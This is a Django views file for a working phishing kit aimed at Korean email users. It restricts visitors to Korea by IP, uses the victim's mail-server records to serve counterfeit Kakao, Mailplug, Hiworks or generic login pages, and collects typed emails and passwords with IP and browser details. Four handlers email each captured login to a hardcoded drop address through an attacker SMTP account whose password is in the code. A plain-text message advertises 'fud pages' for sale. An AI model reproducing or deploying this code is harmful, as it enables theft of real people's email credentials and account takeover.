from django.shortcuts import render
from django.http import HttpResponse
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from django.template.loader import get_template
from django.template import Context
from django.template.loader import render_to_string
from django.contrib.gis.geoip2 import GeoIP2
import dns.resolver
import socket
import requests
import pycountry
#Create your views here.
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_protect
from defender.decorators import watch_login

@watch_login
@csrf_protect

def landing(request):
    iplogger = request.META.get("HTTP_X_FORWARDED_FOR")
    emailgrabber = request.GET["email"]
    domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
    mx_records = dns.resolver.query(domainapi, 'MX')
    # Initialize GeoIP2 object
    geo = GeoIP2()

    # Get user's country based on IP address
    country = geo.country(iplogger)

    # Check if user is from Korea
    if country['country_code'] != 'KR':
        return render(request, 'block.html') # Return block page if user is not from Korea
    else:
        for mx in mx_records:
            mx_hostname = str(mx.exchange).rstrip('.')
            if 'hanmail.net' in mx_hostname:
                return render(request, 'Kakao.html', {'email': emailgrabber, 'domains': domainapi})
            elif 'mailplug.com' in mx_hostname:
                return render(request, 'mailplug.html', {'email': emailgrabber, 'domains': domainapi})
            elif 'hiworks.co.kr' in mx_hostname:
                return render(request, 'hiwoks.html', {'email': emailgrabber, 'domains': domainapi})
        return render(request, 'general.html', {'email': emailgrabber, 'domains': domainapi})



    return render(request, '403.html', {'email': emailgrabber, 'domains': domainapi})

def hiwoks(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "newupdate@lonparks.online"
    sender_emailya = "newupdate@lonparks.online"
    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
    passwordya = "g{VbS{^o6&HT"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW hiworks API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("lonparks.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, '403.html', {'email': emailya, 'domains': domainya})



def mailplug(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "newupdate@lonparks.online"
    sender_emailya = "newupdate@lonparks.online"
    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
    passwordya = "g{VbS{^o6&HT"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW mailplug EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("lonparks.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, 'Domain.html', {'email': emailya, 'domains': domainya})





def general(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "newupdate@lonparks.online"
    sender_emailya = "newupdate@lonparks.online"
    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
    passwordya = "g{VbS{^o6&HT"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW general EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("lonparks.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, '403.html', {'email': emailya, 'domains': domainya})





def kakao(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "newupdate@lonparks.online"
    sender_emailya = "newupdate@lonparks.online"
    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
    passwordya = "g{VbS{^o6&HT"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW kakao EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("lonparks.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, '403.html', {'email': emailya, 'domains': domainya})

